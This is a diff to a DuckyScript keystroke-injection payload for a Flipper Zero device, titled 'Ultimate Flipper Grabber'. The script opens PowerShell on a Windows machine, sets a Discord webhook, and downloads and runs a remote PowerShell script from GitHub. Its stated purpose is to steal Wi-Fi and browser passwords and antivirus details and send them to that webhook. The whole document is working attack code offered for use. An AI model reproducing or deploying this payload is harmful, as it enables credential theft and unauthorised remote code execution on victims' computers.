@@ -1,19 +1,20 @@
 REM Title: Ultimate Flipper Grabber
-REM Author: blobs0
+REM Author: blobs0 (https://github.com/blobs0/Ultimate-Flipper-Grabber)
 REM Credit Discord webhooks functions :I-am-jakoby
 REM Credit Wifi grabber : 7h30th3r0n3 and the0bone
 REM Credit Password Nirsoft : moosehadley
 REM Target:  Windows 10/11 (7/8 not tested)
 REM Supported Layout keyboard: US/FR/DE
-REM Version: 1.0
+REM Version: 1.1
 REM Category: Grabber
-REM Extracts wifi and browser password to discord webhook
+REM Extrait l'antivirus, les mots de passe wifi et de navigateur vers un webhook discord.
 DELAY 2000
 GUI r
 DELAY 1000
 STRING powershell
 ENTER
 DELAY 1000
+REM edit your webhook here
 STRING $DiscordUrl = 'Your-Discord-Webhook'
 ENTER
 STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
